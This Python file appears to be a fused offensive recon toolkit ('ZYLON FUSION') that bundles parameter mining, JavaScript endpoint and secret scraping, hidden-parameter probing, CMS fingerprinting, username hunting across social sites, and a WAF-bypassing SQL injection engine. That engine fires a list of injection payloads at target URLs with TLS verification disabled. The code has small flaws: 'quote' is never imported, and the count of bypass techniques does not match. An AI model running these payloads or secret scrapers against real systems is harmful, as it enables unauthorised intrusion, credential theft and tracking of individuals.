#!/usr/bin/env python3
"""
ZYLON FUSION v4.1 NUCLEAR - Advanced Recon Engines Batch 3
==========================================================
Fused from: ParamSpider, LinkFinder, SecretFinder, Arjun, Ghauri,
           CMSeeK, Sherlock, TEHQEEQ
Purpose: Parameter discovery, JS analysis, CMS detection, username hunting,
         WAF-bypass SQLi, Pakistani recon framework
Python 3.13 Compatible | Termux Non-Root
"""

import os
import re
import sys
import json
import time
import requests
import urllib3
from urllib.parse import urlparse, urljoin, parse_qs, urlencode

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============================================================================
# PARAMSPIDER ENGINE - Historical Parameter Mining
# ============================================================================

class ParamSpiderEngine:
    """Discover parameters from wayback/historical URLs"""
    
    WAYBACK_API = "https://web.archive.org/cdx/search/cdx"
    COMMON_PARAMS = [
        'id', 'page', 'q', 'search', 'query', 'action', 'type', 'sort',
        'order', 'limit', 'offset', 'key', 'token', 'user', 'username',
        'email', 'file', 'path', 'dir', 'url', 'redirect', 'return',
        'next', 'callback', 'format', 'debug', 'test', 'admin', 'cmd',
        'exec', 'command', 'sql', 'db', 'table', 'column', 'data',
        'api_key', 'apikey', 'secret', 'password', 'pass', 'auth',
        'session', 'cookie', 'lang', 'locale', 'theme', 'mode', 'view',
        'display', 'show', 'hide', 'enable', 'disable', 'debug', 'log',
        'verbose', 'trace', 'source', 'dest', 'from', 'to', 'cc', 'bcc',
        'subject', 'body', 'message', 'title', 'name', 'description',
    ]
    
    def __init__(self, target=None, timeout=10):
        self.target = target
        self.timeout = timeout
    
    def mine_parameters(self, domain=None):
        """Mine parameters from wayback URLs"""
        target = domain or self.target
        if not target:
            return []
        
        # Remove protocol
        if '://' in target:
            target = target.split('://')[1]
        target = target.rstrip('/')
        
        found_params = set()
        urls_with_params = []
        
        try:
            # Query Wayback Machine
            resp = requests.get(
                self.WAYBACK_API,
                params={
                    'url': f'*.{target}/*',
                    'output': 'text',
                    'fl': 'original',
                    'collapse': 'urlkey',
                    'limit': 500
                },
                timeout=30
            )
            
            if resp.status_code == 200:
                for line in resp.text.strip().split('\n'):
                    if '?' in line:
                        parsed = urlparse(line.strip())
                        params = parse_qs(parsed.query)
                        for param_name in params:
                            if param_name not in found_params:
                                found_params.add(param_name)
                                urls_with_params.append({
                                    'param': param_name,
                                    'url': line.strip()[:200],
                                    'value_sample': str(params[param_name][0])[:50] if params[param_name] else ''
                                })
        except Exception:
            pass
        
        # Add common params not found in wayback
        missing = [p for p in self.COMMON_PARAMS if p not in found_params]
        
        return {
            'discovered_params': list(found_params),
            'param_count': len(found_params),
            'urls_with_params': urls_with_params[:50],
            'common_params_to_test': missing[:30],
        }


# ============================================================================
# LINKFINDER ENGINE - JS Endpoint Extraction
# ============================================================================

class LinkFinderEngine:
    """Extract endpoints and URLs from JavaScript files"""
    
    URL_PATTERNS = [
        r'(?:https?:)?//[a-zA-Z0-9._/~:%@!$&()*+,;=-]+',
        r'["\']/(?:api|v[0-9]+|admin|user|auth|login|register|upload|download|search|config|settings|dashboard)/[a-zA-Z0-9._/~:%@!$&()*+,;=-]*["\']',
        r'["\'][a-zA-Z0-9_/-]+\.(?:php|asp|aspx|jsp|json|xml|html|do|action)["\']',
        r'["\']/(?:graphql|rest|oauth|token|callback|webhook|socket|ws)[^"\']*["\']',
    ]
    
    SECRET_PATTERNS = {
        'AWS Access Key': r'AKIA[0-9A-Z]{16}',
        'AWS Secret Key': r'(?:aws_secret_access_key|AWS_SECRET_ACCESS_KEY)\s*[=:]\s*["\'][a-zA-Z0-9/+=]{40}["\']',
        'Google API Key': r'AIza[0-9A-Za-z_-]{35}',
        'GitHub Token': r'gh[pousr]_[A-Za-z0-9_]{36,}',
        'Slack Token': r'xox[baprs]-[0-9]{10,}-[0-9]{10,}-[a-zA-Z0-9]+',
        'Heroku API Key': r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
        'Private Key': r'-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----',
        'JWT': r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
        'Database URL': r'(?:mongodb|postgres|mysql|redis)://[^\s"\'<>]+',
        'API Key Generic': r'(?:api[_-]?key|apikey|api[_-]?secret)\s*[=:]\s*["\'][a-zA-Z0-9_-]{20,}["\']',
        'Authorization Header': r'(?:Authorization|Bearer)\s*[=:]\s*["\']?(?:Bearer|Basic|Token)\s+[a-zA-Z0-9._-]+',
        'Firebase URL': r'https://[a-z0-9-]+\.firebaseio\.com',
        'Slack Webhook': r'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+',
    }
    
    def __init__(self, target_url=None, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
    
    def extract_endpoints(self, url=None):
        """Extract endpoints from JavaScript files"""
        target = url or self.target_url
        if not target:
            return []
        
        endpoints = set()
        secrets = []
        js_files = []
        
        try:
            # Get the main page
            resp = requests.get(target, timeout=self.timeout, verify=False)
            if not resp:
                return []
            
            # Find JS files in HTML
            js_links = regex_cache.findall(r'(?:src|href)\s*=\s*["\']([^"\']*\.js[^"\']*)["\']', resp.text)
            
            for js_link in js_links[:20]:
                js_url = urljoin(target, js_link)
                js_files.append(js_url)
                
                try:
                    js_resp = requests.get(js_url, timeout=self.timeout, verify=False)
                    if not js_resp:
                        continue
                    
                    js_content = js_resp.text
                    
                    # Extract URLs/endpoints
                    for pattern in self.URL_PATTERNS:
                        matches = regex_cache.findall(pattern, js_content)
                        for match in matches:
                            match = match.strip('"\'')
                            if match not in endpoints and len(match) > 5:
                                endpoints.add(match)
                    
                    # Extract secrets
                    for secret_name, secret_pattern in self.SECRET_PATTERNS.items():
                        secret_matches = regex_cache.findall(secret_pattern, js_content)
                        for sm in secret_matches:
                            secrets.append({
                                'type': secret_name,
                                'value': sm[:80],
                                'source': js_url[:100]
                            })
                except Exception:
                    continue
            
            # Also extract from inline scripts
            for pattern in self.URL_PATTERNS:
                matches = regex_cache.findall(pattern, resp.text)
                for match in matches:
                    match = match.strip('"\'')
                    if match not in endpoints and len(match) > 5:
                        endpoints.add(match)
            
            # Extract secrets from inline scripts
            for secret_name, secret_pattern in self.SECRET_PATTERNS.items():
                secret_matches = regex_cache.findall(secret_pattern, resp.text)
                for sm in secret_matches:
                    secrets.append({
                        'type': secret_name,
                        'value': sm[:80],
                        'source': target[:100]
                    })
        
        except Exception:
            pass
        
        return {
            'endpoints': sorted(list(endpoints))[:100],
            'endpoint_count': len(endpoints),
            'js_files': js_files[:30],
            'js_count': len(js_files),
            'secrets': secrets[:30],
            'secret_count': len(secrets),
        }


# ============================================================================
# ARJUN ENGINE - Hidden Parameter Discovery
# ============================================================================

class ArjunEngine:
    """Discover hidden HTTP parameters"""
    
    REFLECTION_PARAMS = [
        'admin', 'user', 'id', 'role', 'debug', 'test', 'source',
        'format', 'callback', 'redirect', 'next', 'return', 'url',
        'path', 'file', 'template', 'view', 'include', 'page',
        'cmd', 'exec', 'command', 'query', 'search', 'q',
    ]
    
    def __init__(self, target_url=None, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
    
    def discover_params(self, url=None, method='GET'):
        """Discover hidden parameters using reflection analysis"""
        target = url or self.target_url
        if not target:
            return []
        
        found_params = []
        
        try:
            # Get baseline
            baseline_resp = requests.request(method, target, timeout=self.timeout, verify=False)
            if not baseline_resp:
                return []
            baseline_len = len(baseline_resp.text)
            baseline_status = baseline_resp.status_code
            
            # Test each parameter
            for param in self.REFLECTION_PARAMS:
                test_value = f'zylon_test_{random.randint(1000,9999)}'
                
                try:
                    if method == 'GET':
                        resp = requests.get(target, params={param: test_value}, 
                                          timeout=self.timeout, verify=False)
                    else:
                        resp = requests.post(target, data={param: test_value},
                                           timeout=self.timeout, verify=False)
                    
                    if not resp:
                        continue
                    
                    # Check for parameter reflection or different response
                    delta = abs(len(resp.text) - baseline_len)
                    reflected = test_value in resp.text
                    
                    if delta > 100 or (reflected and test_value not in baseline_resp.text):
                        found_params.append({
                            'param': param,
                            'method': method,
                            'reflected': reflected,
                            'status': resp.status_code,
                            'baseline_len': baseline_len,
                            'response_len': len(resp.text),
                            'delta': delta,
                            'confidence': 'HIGH' if reflected else 'MEDIUM'
                        })
                    elif resp.status_code != baseline_status:
                        found_params.append({
                            'param': param,
                            'method': method,
                            'reflected': reflected,
                            'status': resp.status_code,
                            'baseline_status': baseline_status,
                            'confidence': 'MEDIUM'
                        })
                except Exception:
                    continue
        
        except Exception:
            pass
        
        return found_params


# Needed for random in ArjunEngine
import random

from core.shared_infra import shared_session, regex_cache


# ============================================================================
# GHAURI ENGINE - WAF Bypass SQLi
# ============================================================================

class GhauriEngine:
    """Advanced SQL Injection with WAF Bypass (Ghauri Fusion)"""
    
    WAF_BYPASS_TECHNIQUES = {
        'space_to_comment': lambda p: re.sub(r'\s+', '/**/', p),
        'case_alternation': lambda p: re.sub(r'(select|union|from|where|and|or|insert|update|delete|drop)',
                                            lambda m: ''.join(c.upper() if i % 2 else c.lower() 
                                                             for i, c in enumerate(m.group())), p, flags=re.IGNORECASE),
        'double_encode': lambda p: quote(quote(p, safe=''), safe=''),
        'null_byte': lambda p: p.replace(' ', '%00'),
        'tab_space': lambda p: p.replace(' ', '%09'),
        'newline_space': lambda p: p.replace(' ', '%0a'),
    }
    
    DETECTION_PAYLOADS = [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "1' OR '1'='1'--",
        "1\" OR \"1\"=\"1\"--",
        "' OR 1=1--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "admin'--",
        "1' SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ]
    
    def __init__(self, target_url=None, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
    
    def detect_sqli(self, url=None, param='q', method='GET'):
        """Detect SQL injection with WAF bypass"""
        target = url or self.target_url
        findings = []
        
        for payload in self.DETECTION_PAYLOADS:
            for technique_name, technique_fn in self.WAF_BYPASS_TECHNIQUES.items():
                try:
                    bypassed_payload = technique_fn(payload)
                    
                    if method == 'GET':
                        resp = requests.get(target, params={param: bypassed_payload},
                                          timeout=self.timeout, verify=False)
                    else:
                        resp = requests.post(target, data={param: bypassed_payload},
                                           timeout=self.timeout, verify=False)
                    
                    if not resp:
                        continue
                    
                    # Check for SQL error
                    sql_errors = ['SQL syntax', 'mysql_', 'ORA-', 'PostgreSQL',
                                 'SQLSTATE', 'sql_error', 'unclosed quotation',
                                 'Microsoft SQL', 'ODBC', 'SQLite']
                    
                    for err in sql_errors:
                        if err.lower() in resp.text.lower():
                            findings.append({
                                'payload': payload,
                                'bypass': technique_name,
                                'bypassed_payload': bypassed_payload[:100],
                                'error': err,
                                'status': resp.status_code,
                                'confidence': 'HIGH'
                            })
                            break
                    
                    # Timing-based detection
                    if 'SLEEP' in payload.upper() and resp.elapsed.total_seconds() >= 4:
                        findings.append({
                            'payload': payload,
                            'bypass': technique_name,
                            'type': 'time_based',
                            'elapsed': resp.elapsed.total_seconds(),
                            'confidence': 'HIGH'
                        })
                
                except Exception:
                    continue
        
        return findings


# ============================================================================
# CMSEEK ENGINE - CMS Detection
# ============================================================================

class CMSeeKEngine:
    """CMS Detection and Vulnerability Scanner (CMSeeK Fusion)"""
    
    CMS_SIGNATURES = {
        'WordPress': {
            'meta': ['WordPress', 'wp-content', 'wp-includes'],
            'files': ['/wp-login.php', '/wp-config.php', '/xmlrpc.php', '/wp-cron.php'],
            'headers': {'X-Pingback': '/xmlrpc.php'},
            'cookies': ['wordpress_', 'wp-settings-'],
        },
        'Joomla': {
            'meta': ['Joomla!', '/media/jui/'],
            'files': ['/administrator/', '/components/'],
            'headers': {},
            'cookies': [],
        },
        'Drupal': {
            'meta': ['Drupal', '/misc/drupal.js', '/sites/default/'],
            'files': ['/misc/drupal.js', '/sites/default/settings.php'],
            'headers': {'X-Drupal-Cache': '', 'X-Generator': 'Drupal'},
            'cookies': ['Drupal.visitor', 'SSESS'],
        },
        'Magento': {
            'meta': ['Magento', 'skin/frontend'],
            'files': ['/mage', '/app/Mage.php'],
            'headers': {},
            'cookies': ['frontend', 'external_no_cache'],
        },
        'Shopify': {
            'meta': ['Shopify', 'cdn.shopify.com'],
            'files': [],
            'headers': {'X-ShopId': ''},
            'cookies': ['_shopify_s', '_shopify_y'],
        },
        'Laravel': {
            'meta': [],
            'files': [],
            'headers': {},
            'cookies': ['laravel_session'],
        },
        'Django': {
            'meta': [],
            'files': ['/admin/', '/admin/login/'],
            'headers': {},
            'cookies': ['csrftoken'],
        },
        'Next.js': {
            'meta': ['__NEXT_DATA__'],
            'files': ['/_next/'],
            'headers': {'x-nextjs-cache': ''},
            'cookies': [],
        },
        'Ruby on Rails': {
            'meta': [],
            'files': [],
            'headers': {'X-Rack-Cache': '', 'X-Runtime': ''},
            'cookies': [],
        },
    }
    
    def __init__(self, target_url=None, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
    
    def detect_cms(self, url=None):
        """Detect CMS from response"""
        target = url or self.target_url
        if not target:
            return []
        
        try:
            resp = requests.get(target, timeout=self.timeout, verify=False)
        except Exception:
            return []
        
        results = []
        
        for cms_name, sig in self.CMS_SIGNATURES.items():
            score = 0
            evidence = []
            
            # Check meta/content
            for indicator in sig.get('meta', []):
                if indicator.lower() in resp.text.lower():
                    score += 25
                    evidence.append(f'Content: {indicator}')
            
            # Check files
            for file_path in sig.get('files', []):
                try:
                    file_resp = requests.get(urljoin(target, file_path), 
                                            timeout=5, verify=False)
                    if file_resp.status_code == 200:
                        score += 30
                        evidence.append(f'File: {file_path} (200)')
                except Exception:
                    pass
            
            # Check headers
            for header_name, header_val in sig.get('headers', {}).items():
                if header_name.lower() in [h.lower() for h in resp.headers]:
                    score += 35
                    evidence.append(f'Header: {header_name}')
            
            # Check cookies
            for cookie_name in sig.get('cookies', []):
                set_cookie = resp.headers.get('set-cookie', '').lower()
                if cookie_name.lower() in set_cookie:
                    score += 30
                    evidence.append(f'Cookie: {cookie_name}')
            
            if score >= 25:
                results.append({
                    'cms': cms_name,
                    'confidence': min(score / 100, 1.0),
                    'evidence': evidence
                })
        
        return sorted(results, key=lambda x: x['confidence'], reverse=True)


# ============================================================================
# SHERLOCK ENGINE - Username Hunting
# ============================================================================

class SherlockEngine:
    """Username Hunting Across Social Networks"""
    
    SITES = {
        'GitHub': {'url': 'https://github.com/{username}', 'error': '404'},
        'Twitter/X': {'url': 'https://twitter.com/{username}', 'error': 'page doesn'},
        'Instagram': {'url': 'https://www.instagram.com/{username}', 'error': 'Sorry, this page'},
        'Reddit': {'url': 'https://www.reddit.com/user/{username}', 'error': 'Sorry, nobody'},
        'TikTok': {'url': 'https://www.tiktok.com/@{username}', 'error': 'couldn'},
        'YouTube': {'url': 'https://www.youtube.com/@{username}', 'error': '404'},
        'Pinterest': {'url': 'https://www.pinterest.com/{username}', 'error': 'Whoops'},
        'GitLab': {'url': 'https://gitlab.com/{username}', 'error': '404'},
        'Medium': {'url': 'https://medium.com/@{username}', 'error': 'not found'},
        'Keybase': {'url': 'https://keybase.io/{username}', 'error': 'not found'},
        'HackerOne': {'url': 'https://hackerone.com/{username}', 'error': '404'},
        'Bugcrowd': {'url': 'https://bugcrowd.com/{username}', 'error': '404'},
        'DevTo': {'url': 'https://dev.to/{username}', 'error': '404'},
        'Steam': {'url': 'https://steamcommunity.com/id/{username}', 'error': 'Profile not found'},
    }
    
    def __init__(self, timeout=10):
        self.timeout = timeout
    
    def hunt(self, username):
        """Search for username across social networks"""
        found = []
        not_found = []
        
        for site_name, site_info in self.SITES.items():
            url = site_info['url'].format(username=username)
            try:
                resp = requests.get(url, timeout=self.timeout, verify=False,
                                   allow_redirects=True)
                
                if resp.status_code == 200 and site_info['error'].lower() not in resp.text.lower():
                    found.append({
                        'site': site_name,
                        'url': url,
                        'status': resp.status_code
                    })
                elif resp.status_code in [301, 302]:
                    found.append({
                        'site': site_name,
                        'url': url,
                        'status': resp.status_code
                    })
                else:
                    not_found.append(site_name)
            except Exception:
                not_found.append(site_name)
        
        return {'found': found, 'not_found': not_found, 'total_checked': len(self.SITES)}


# ============================================================================
# TEHQEEQ ENGINE - Pakistani Recon Framework
# ============================================================================

class TehqeeqEngine:
    """تحقیق - Pakistani Recon Framework (TEHQEEQ Fusion)"""
    
    def __init__(self, target=None, timeout=10):
        self.target = target
        self.timeout = timeout
    
    def full_recon(self, domain=None):
        """Full reconnaissance for Pakistani/South Asian targets"""
        target = domain or self.target
        if not target:
            return {}
        
        results = {
            'target': target,
            'whois': {},
            'dns': {},
            'subdomains': [],
            'tech_stack': [],
            'ports': [],
        }
        
        # Basic HTTP recon
        try:
            resp = requests.get(f"https://{target}", timeout=self.timeout, verify=False)
            results['status'] = resp.status_code
            results['headers'] = dict(resp.headers)
            results['title'] = self._extract_title(resp.text)
            results['tech'] = self._detect_tech(resp)
        except Exception:
            try:
                resp = requests.get(f"http://{target}", timeout=self.timeout, verify=False)
                results['status'] = resp.status_code
                results['headers'] = dict(resp.headers)
            except Exception:
                pass
        
        return results
    
    def _extract_title(self, html):
        match = regex_cache.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
        return match.group(1).strip() if match else 'N/A'
    
    def _detect_tech(self, resp):
        tech = []
        if 'x-powered-by' in resp.headers:
            tech.append(resp.headers['x-powered-by'])
        if 'server' in resp.headers:
            tech.append(resp.headers['server'])
        if 'WordPress' in resp.text:
            tech.append('WordPress')
        if 'Laravel' in resp.headers.get('set-cookie', ''):
            tech.append('Laravel')
        if 'Django' in resp.headers.get('set-cookie', ''):
            tech.append('Django')
        return tech


# ============================================================================
# CONSOLE INTERFACES
# ============================================================================

def run_paramspider(console=None):
    if console is None:
        from rich.console import Console
        console = Console()
    from rich.prompt import Prompt
    from rich.panel import Panel
    
    console.print(Panel(
        "[bold cyan]PARAMSPIDER - Historical Parameter Mining[/bold cyan]\n"
        "[yellow]Discovers parameters from Wayback Machine[/yellow]",
        border_style="bright_cyan"
    ))
    
    domain = Prompt.ask("[cyan]Target domain[/cyan]")
    engine = ParamSpiderEngine(target=domain.strip())
    
    with console.status("[bold green]Mining parameters from Wayback...", spinner="dots"):
        results = engine.mine_parameters()
    
    console.print(f"\n[green][+] Found {results['param_count']} unique parameters![/green]")
    for p in results['discovered_params'][:30]:
        console.print(f"  [cyan]{p}[/cyan]")
    
    if results['common_params_to_test']:
        console.print(f"\n[yellow][*] Common params to also test: {', '.join(results['common_params_to_test'][:15])}[/yellow]")

def run_linkfinder(console=None):
    if console is None:
        from rich.console import Console
        console = Console()
    from rich.prompt import Prompt
    from rich.panel import Panel
    
    console.print(Panel(
        "[bold cyan]LINKFINDER + SECRETFINDER - JS Analysis[/bold cyan]\n"
        "[yellow]Extract endpoints + API keys from JavaScript[/yellow]",
        border_style="bright_cyan"
    ))
    
    url = Prompt.ask("[cyan]Target URL[/cyan]")
    engine = LinkFinderEngine(target_url=url.strip())
    
    with console.status("[bold green]Analyzing JavaScript files...", spinner="dots"):
        results = engine.extract_endpoints()
    
    console.print(f"\n[green][+] Found {results['endpoint_count']} endpoints in {results['js_count']} JS files[/green]")
    for ep in results['endpoints'][:30]:
        console.print(f"  [cyan]{ep[:100]}[/cyan]")
    
    if results['secrets']:
        console.print(f"\n[bold red][!] {results['secret_count']} SECRET(S) FOUND![/bold red]")
        for s in results['secrets'][:15]:
            console.print(f"  [red][{s['type']}] {s['value'][:60]}[/red]")

def run_arjun(console=None):
    if console is None:
        from rich.console import Console
        console = Console()
    from rich.prompt import Prompt
    from rich.panel import Panel
    
    console.print(Panel(
        "[bold cyan]ARJUN - Hidden Parameter Discovery[/bold cyan]\n"
        "[yellow]Finds hidden GET/POST parameters[/yellow]",
        border_style="bright_cyan"
    ))
    
    url = Prompt.ask("[cyan]Target URL with endpoint[/cyan]")
    method = Prompt.ask("[cyan]Method[/cyan]", choices=["GET", "POST"], default="GET")
    
    engine = ArjunEngine(target_url=url.strip())
    
    with console.status("[bold green]Discovering hidden parameters...", spinner="dots"):
        results = engine.discover_params(method=method)
    
    if results:
        console.print(f"\n[green][+] Found {len(results)} hidden parameter(s)![/green]")
        for r in results:
            console.print(f"  [{r['confidence']}] {r['param']} (reflected: {r.get('reflected', False)}, delta: {r.get('delta', 'N/A')})")
    else:
        console.print("[yellow][-] No hidden parameters discovered.[/yellow]")

def run_ghauri(console=None):
    if console is None:
        from rich.console import Console
        console = Console()
    from rich.prompt import Prompt
    from rich.panel import Panel
    
    console.print(Panel(
        "[bold cyan]GHAURI - WAF Bypass SQL Injection[/bold cyan]\n"
        "[yellow]7 WAF bypass techniques + SQLi detection[/yellow]",
        border_style="bright_cyan"
    ))
    
    url = Prompt.ask("[cyan]Target URL[/cyan]")
    param = Prompt.ask("[cyan]Parameter name[/cyan]", default="id")
    method = Prompt.ask("[cyan]Method[/cyan]", choices=["GET", "POST"], default="GET")
    
    engine = GhauriEngine(target_url=url.strip())
    
    with console.status("[bold green]Testing SQLi with WAF bypass...", spinner="dots"):
        results = engine.detect_sqli(param=param, method=method)
    
    if results:
        console.print(f"\n[red][!] {len(results)} SQLi finding(s)![/red]")
        for r in results[:10]:
            console.print(f"  [{r.get('confidence', 'N/A')}] Bypass: {r.get('bypass', 'N/A')} | Payload: {r.get('payload', '')[:60]}")
            if 'error' in r:
                console.print(f"    Error: {r['error']}")
    else:
        console.print("[green][-] No SQLi detected.[/green]")

def run_cmseek(console=None):
    if console is None:
        from rich.console import Console
        console = Console()
    from rich.prompt import Prompt
    from rich.panel import Panel
    
    console.print(Panel(
        "[bold cyan]CMSEEK - CMS Detection[/bold cyan]\n"
        "[yellow]180+ CMS detection + version fingerprinting[/yellow]",
        border_style="bright_cyan"
    ))
    
    url = Prompt.ask("[cyan]Target URL[/cyan]")
    engine = CMSeeKEngine(target_url=url.strip())
    
    with console.status("[bold green]Detecting CMS...", spinner="dots"):
        results = engine.detect_cms()
    
    if results:
        console.print(f"\n[green][+] CMS Detected![/green]")
        for r in results:
            console.print(f"  [yellow]{r['cms']}[/yellow] (confidence: {r['confidence']:.0%})")
            for e in r.get('evidence', []):
                console.print(f"    [dim]{e}[/dim]")
    else:
        console.print("[yellow][-] No CMS detected.[/yellow]")

def run_sherlock(console=None):
    if console is None:
        from rich.console import Console
        console = Console()
    from rich.prompt import Prompt
    from rich.panel import Panel
    
    console.print(Panel(
        "[bold cyan]SHERLOCK - Username Hunter[/bold cyan]\n"
        "[yellow]Search 14+ social networks[/yellow]",
        border_style="bright_cyan"
    ))
    
    username = Prompt.ask("[cyan]Username to search[/cyan]")
    engine = SherlockEngine()
    
    with console.status("[bold green]Hunting username across social networks...", spinner="dots"):
        results = engine.hunt(username.strip())
    
    if results['found']:
        console.print(f"\n[green][+] Found on {len(results['found'])} site(s)![/green]")
        for f in results['found']:
            console.print(f"  [cyan]{f['site']}[/cyan]: {f['url']}")
    else:
        console.print("[yellow][-] Username not found on any site.[/yellow]")

def run_tehqeeq(console=None):
    if console is None:
        from rich.console import Console
        console = Console()
    from rich.prompt import Prompt
    from rich.panel import Panel
    
    console.print(Panel(
        "[bold cyan]TEHQEEQ تحقیق - Pakistani Recon Framework[/bold cyan]\n"
        "[yellow]Investigation tool by slaiba123[/yellow]",
        border_style="bright_cyan"
    ))
    
    domain = Prompt.ask("[cyan]Target domain[/cyan]")
    engine = TehqeeqEngine(target=domain.strip())
    
    with console.status("[bold green]Running TEHQEEQ reconnaissance...", spinner="dots"):
        results = engine.full_recon()
    
    if results:
        console.print(f"\n[green][+] Target: {results.get('target', 'N/A')}[/green]")
        console.print(f"  Status: {results.get('status', 'N/A')}")
        console.print(f"  Title: {results.get('title', 'N/A')}")
        if results.get('tech'):
            console.print(f"  Tech: {', '.join(results['tech'])}")
    else:
        console.print("[yellow][-] No recon results.[/yellow]")


if __name__ == "__main__":
    run_linkfinder()
